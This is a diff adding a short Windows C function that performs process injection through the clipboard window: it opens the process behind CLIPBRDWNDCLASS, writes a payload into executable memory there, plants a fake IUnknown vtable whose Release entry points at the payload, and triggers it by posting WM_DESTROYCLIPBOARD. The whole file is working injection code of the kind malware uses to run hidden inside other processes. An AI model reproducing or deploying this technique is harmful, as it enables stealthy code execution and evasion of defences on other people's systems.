@@ -1,0 +1,46 @@
+typedef struct _IUnknown_t {
+    // a pointer to virtual function table
+    ULONG_PTR lpVtbl;
+    // the virtual function table
+    ULONG_PTR QueryInterface;
+    ULONG_PTR AddRef;
+    ULONG_PTR Release;       // executed for WM_DESTROYCLIPBOARD
+} IUnknown_t;
+
+// The following code assumes a valid clipboard window already exists. There is no error checking.
+VOID clipboard(LPVOID payload, DWORD payloadSize) {
+    HANDLE     hp;
+    HWND       hw;
+    DWORD      id;
+    IUnknown_t iu;
+    LPVOID     cs, ds;
+    SIZE_T     wr;
+    
+    // 1. Find a private clipboard.
+    //    Obtain the process id and open it
+    hw = FindWindowEx(HWND_MESSAGE, NULL, L"CLIPBRDWNDCLASS", NULL);
+    GetWindowThreadProcessId(hw, &id);
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    // 2. Allocate RWX memory in process and write payload
+    cs = VirtualAllocEx(hp, NULL, payloadSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+    
+    // 3. Allocate RW memory in process.
+    //    Initialize and write IUnknown interface
+    ds = VirtualAllocEx(hp, NULL, sizeof(IUnknown_t),
+        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    iu.lpVtbl  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
+    iu.Release = (ULONG_PTR)cs;
+    WriteProcessMemory(hp, ds, &iu, sizeof(IUnknown_t), &wr);
+    
+    // 4. Set the interface property and trigger execution
+    SetProp(hw, L"ClipboardDataObjectInterface", ds);
+    PostMessage(hw, WM_DESTROYCLIPBOARD, 0, 0);
+    
+    // 5. Release memory for code and data
+    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
+    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);
+    CloseHandle(hp);
+}
